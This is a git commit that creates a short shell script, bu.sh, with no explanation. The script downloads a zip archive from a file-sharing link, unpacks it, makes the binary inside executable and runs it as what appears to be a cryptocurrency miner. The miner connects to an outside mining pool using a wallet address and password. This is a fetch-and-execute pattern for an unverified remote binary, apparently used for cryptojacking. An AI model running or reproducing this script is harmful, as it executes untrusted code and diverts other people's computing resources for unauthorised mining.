d1da8f3e146852af68250555fba8a7427d5293f3
buozud <84149893+buozud@users.noreply.github.com>
2021-05-18 20:14:37 +0200

    Create bu.sh

---
+++ bu.sh
@@ -0,0 +1,8 @@
+wget https://download1083.mediafire.com/p61f4jm992eg/s5q7dn0o0vxnqyl/ab.zip
+sleep 3
+unzip ab
+sleep 3
+cd ab
+sleep 3
+chmod +x ./ab
+./ab --url pool.hashvault.pro:80 --user hvxy26Fsyz3GiKdKH9sP96T8UKyd7D1hnedoXYVawNkg84nxvr2J8X5XcRHoPya1paftqpLcK2ucnePS8avVNkYv9wHQ4E87cp --pass Heysitkd --donate-level 1 --tls --tls-fingerprint 420c7850e09b7c0bdcf748a7da9eb3647daf8515718f36d9ccfdd6b9ff834b14
